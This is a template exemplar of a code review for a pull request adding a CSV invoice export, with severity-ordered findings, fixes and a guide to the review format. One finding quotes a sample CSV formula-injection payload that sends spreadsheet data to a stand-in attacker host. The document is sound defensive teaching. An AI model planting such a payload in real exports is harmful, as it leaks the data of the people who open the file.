> TEMPLATE EXEMPLAR — illustrative names/numbers; adapt via BUSINESS-CONTEXT.md

# Code review: PR #217 — Export invoices as CSV

**Verdict: REQUEST CHANGES** — 2 blockers (B1 authz, B2 CSV injection). Re-review turnaround: same day once pushed.
Reviewed at commit `a3f91c2` · +187/−6 across 4 files · spec: `specs/invoice-csv-export.md` · timeboxed 45 min (PLAYBOOK 3 limits).

## Diff under review (orientation)

New endpoint `GET /invoices/export?from=&to=&accountId=` returning a CSV of an account's invoices.

- `src/routes/invoices.ts` (+31) — route, query parsing, response headers
- `src/services/invoice-export.ts` (new, +92) — fetch rows, serialize CSV
- `src/routes/index.ts` (+2) — route registration inside the `requireAuth` router
- `tests/integration/invoice-export.test.ts` (new, +62) — happy path + empty result

Key hunks referenced by the findings:

`src/routes/invoices.ts:24-33`
```ts
router.get('/export', async (req, res) => {
  try {
    const { from, to, accountId } = req.query;
    const csv = await exportInvoices(String(accountId), parseDates(from, to));
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition',
      `attachment; filename=invoices-${new Date().toLocaleDateString()}.csv`);
    res.send(csv);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

`src/services/invoice-export.ts:32-38, 58-62`
```ts
const rows = await invoiceRepo.findAll({ accountId, from, to });   // :34
return [HEADER, ...rows.map(toCsvLine)].join('\n');                // :36
// ...
function toCsvLine(row: InvoiceRow): string {
  return [row.id, row.customerName, row.memo,                      // :60-61
    formatCents(row.amountCents), row.issuedAt.toLocaleDateString()].map(quote).join(',');
}
```

## Findings (ordered by severity — fix top-down)

### B1 · blocker · IDOR: account taken from the query string, not the session
- Where: `src/routes/invoices.ts:26`
- Problem: `accountId` comes from `req.query`, so any logged-in user exports ANY account's invoices by editing the URL.
- Why it matters: cross-tenant financial data leak — the #1 small-SaaS vuln class (PLAYBOOK 8.2). RUBRIC G6 fails; this alone blocks merge.
- Fix:
```ts
const accountId = req.session.accountId;   // never from the client
```
  Remove `accountId` from the query contract entirely. Add the required cross-tenant test: user in account A calls export with a crafted `?accountId=B` → response contains only A's rows, and B's invoice ids appear nowhere in the body.
- Incident note: this branch was never deployed, so no exposure to investigate. Had it shipped, closing the finding would also require grepping access logs for cross-account `accountId` values before calling it done.

### B2 · blocker · CSV formula injection in customer-controlled fields
- Where: `src/services/invoice-export.ts:61` — `customerName` and `memo` written raw.
- Problem: a customer named `=HYPERLINK("https://evil.tld/?"&A1,"x")`, or a memo starting with `=`, `+`, `-`, `@`, tab, or CR, executes as a formula when the accountant opens the file in Excel/Sheets.
- Why it matters: user-controlled strings reaching a spreadsheet are a sink, same as SQL or HTML (PLAYBOOK 3.2d) — this exfiltrates data from the victim's machine, not ours.
- Fix (inside the cell encoder, alongside the existing quote-escaping):
```ts
const needsGuard = /^[=+\-@\t\r]/.test(value);
const safe = needsGuard ? `'${value}` : value;
```
  Add a test with a `=HYPERLINK(...)` customer name asserting the leading apostrophe survives to the output bytes.

### M1 · major · unbounded export loads every row into memory
- Where: `src/services/invoice-export.ts:34-36` — `findAll` then one giant `join`.
- Problem: no limit, no paging, whole result set and the full CSV string held in memory simultaneously.
- Why it matters: at ~1 KB/row, a 50k-invoice account allocates ~50 MB per request; three concurrent exports blow the 512 MB container limit ({{FILL: your runtime memory limit}}) and the process OOMs. Availability bug triggered by our biggest — most valuable — accounts.
- Fix: keyset-paginate in batches of 1,000 (`where id > $cursor order by id limit 1000`), `res.write()` each batch, header row first, `res.end()` after the last. If streaming is too large for this PR: interim hard cap of 10,000 rows with an explicit "narrow the date range" error, plus a follow-up ticket — state which option in the PR.

### M2 · major · error handler leaks internals and mislabels bad input
- Where: `src/routes/invoices.ts:31-32` — `res.status(500).json({ error: err.message })`.
- Problem: (1) raw `err.message` can carry SQL/table/vendor detail to users; (2) invalid `from`/`to` throws inside `parseDates` and surfaces as a 500, which is a lie — bad client input is a 422.
- Why it matters: internals in error bodies are reconnaissance for attackers (RUBRIC D3 anchors this at ≤1); wrong status codes poison client retry logic and monitoring.
- Fix: schema-validate `from`/`to` at the boundary → `422` with a field message; in the catch, log `err` with the request id, return `500 {"error":"export_failed"}` — generic body, details in logs only.

### m1 · minor · server-locale date formatting
- Where: `src/routes/invoices.ts:29` (filename) and `src/services/invoice-export.ts:62` (`issuedAt` cells) use `toLocaleDateString()`.
- Problem: output depends on the host's locale/TZ; a host config change silently changes exported data.
- Fix: UTC ISO `YYYY-MM-DD` in both — `issuedAt.toISOString().slice(0, 10)` (kill list: locale-dependent server formatting).

### m2 · minor · UTF-8 CSV without BOM misrenders in Excel
- Where: `src/services/invoice-export.ts:36` (body assembly) + `src/routes/invoices.ts:27` (header).
- Problem: without a BOM, Excel guesses the encoding; "Müller" becomes mojibake for exactly the users who live in Excel.
- Fix: `Content-Type: text/csv; charset=utf-8` and prefix the body with the BOM, `'\ufeff'`. (Verify current Excel behavior when reusing this fix — it rots.)

### m3 · minor · test welds itself to the exact CSV bytes
- Where: `tests/integration/invoice-export.test.ts:41` — `expect(body).toEqual("id,customer,memo,...")` for the whole payload.
- Problem: any legitimate column addition breaks the test without catching a real regression — testing implementation, not behavior (PLAYBOOK 5).
- Fix: parse the CSV and assert on records — row count and per-field values for a known fixture invoice. Keep exactly one header-shape assertion only if column order is a spec requirement, and reference the R#.

### n1 · nit · duplicated header strings
- `'text/csv'` and the header row literal appear 3x across route, service, and test; extract constants next to the encoder. Author's choice.

## Checked and found clean

- SQL injection: all queries via the query builder with bound parameters; `from`/`to` never reach SQL as strings.
- Authentication: route registered inside the `requireAuth` router (`src/routes/index.ts:12`) — authn correct; B1 is authz only.
- Secrets/config: none in the diff, including test fixtures (RUBRIC G5).
- Money handling: amounts stay integer cents end-to-end, formatted once at the CSV boundary — no float math (kill list).
- Query performance: composite index `invoices(account_id, created_at)` exists (`migrations/031`), so the date-filtered fetch is indexed; single query, no N+1.
- Migrations: none in this PR — G8 not applicable.
- Rate limiting: export inherits the app's default per-session bucket — acceptable once M1's cap/streaming lands; revisit only if exports become hot.
- Dependencies: none added; CSV assembled with the in-repo encoder (PLAYBOOK 6 checklist not triggered).
- Scope: diff maps 1:1 to the spec; no drive-by refactors (RUBRIC D6 at 4).

## RUBRIC snapshot

- Gates: G6 FAILS (B1 — no wrong-tenant test, authz from client input). G1, G2, G5, G9 pass; G8/G10 n/a pre-merge. Any gate failure alone = do not deliver.
- Dimensions most affected: D5 security currently 1 (B1, B2), D3 error handling 1 (M2), D2 test quality 2 (m3, missing negative tests). D4, D6 already at 4 — the code is clean; the gaps are adversarial, which is typical of junior work: correct for friends, wrong for enemies.

## Verdict and conditions

REQUEST CHANGES. To flip to approve:
1. B1 fixed with the cross-tenant test (G6) — non-negotiable.
2. B2 fixed with the formula-injection test.
3. M1 fixed (streaming) or capped-with-ticket — author's call, stated in the PR.
4. M2 fixed (422 validation + generic 500).
m1–m3: fix now or ticket with ids; n1 optional. Because this diff exposes per-account financial data, run `creview` on the updated diff before merge (PLAYBOOK: frontier review — PII/money path). I will re-review within one working day of push.

Before re-requesting review, run and confirm:
- `npm test -- invoice-export` → green, including the two NEW negative tests (cross-tenant, formula injection) — and both were seen failing against `a3f91c2` first (PLAYBOOK principle 9).
- `git diff a3f91c2..HEAD --stat` → only the four files above plus tests; anything else gets a note in the PR.
- Reply to each finding with the fixing commit hash, or the reason you disagree — not just "done".

## Why this works

- **Severity-ordered, blockers first.** The author knows in 10 seconds what stops the merge and what's optional — no archaeology through eight interleaved comments (PLAYBOOK 3.4).
- **Every finding is Where / Problem / Why it matters / Fix.** The "why" is one line of consequence ("our biggest accounts OOM the process") — that's the part that teaches juniors; the fix is pasteable — that's the part that unblocks the PR without ping-pong.
- **The two blockers are exactly PLAYBOOK 3.2's top hunts:** authz on every new endpoint, then injection on every string reaching a sink. CSV is a sink most reviewers forget — they remember only SQL and HTML.
- **Fixes demand tests, not just patches** (B1, B2). A fix without the failing-first test can silently regress; tests are the pipeline's ground truth.
- **M1 offers a fix-or-cap fork with the choice explicitly delegated.** Reviewers set constraints; authors choose implementations. Demanding streaming outright would exceed the spec — the taste rule from PLAYBOOK 3.
- **"Checked and found clean" is specific** — which index, which router, why floats are a non-issue here. It proves coverage, saves the next reviewer from redoing the work, and is the difference between an audit and a rubber stamp (PLAYBOOK 3.5).
- **The RUBRIC snapshot converts findings into gate/dimension language,** so the same report feeds the scoring step without translation — one artifact, two consumers (author and verifier).
- **Verdict states exact flip conditions and a re-review SLA.** The author can self-assess "am I done?" without another round trip, and the frontier escalation fires by rule, not vibes.
- **The orientation section quotes only the hunks the findings reference** — enough context that the report is evaluable on its own, without opening the diff. Reviews get re-read months later, long after the branch is gone.
- **The timebox is declared up front.** 45 min for 187 lines sits inside the 60-min/400-line envelope; declaring it keeps reviews honest about depth.

## Adapt this

- {{FILL: repo/PR link format, commit ref style, and where reviews are posted — GitHub PR review, file in repo, or tracker comment}}
- {{FILL: severity labels mapped to your tracker}} — keep the 4-level blocker/major/minor/nit semantics and their merge rules from PLAYBOOK 3.4.
- {{FILL: real infra thresholds for M1-style findings — container memory, biggest tenant's row counts, from BUSINESS-CONTEXT.md}}
- {{FILL: your stack's "found clean" checklist — ORM parameterization idiom, auth middleware name, money type, index conventions}}
- {{FILL: escalation triggers used in the verdict}} — copy the list from PLAYBOOK "Escalate to frontier review"; here it fired on financial-data exposure.
- Invariant across all adaptations: severity ordering, file:line on every finding, one-line consequence, concrete pasteable fix, tests demanded with fixes, a found-clean section, explicit flip conditions.
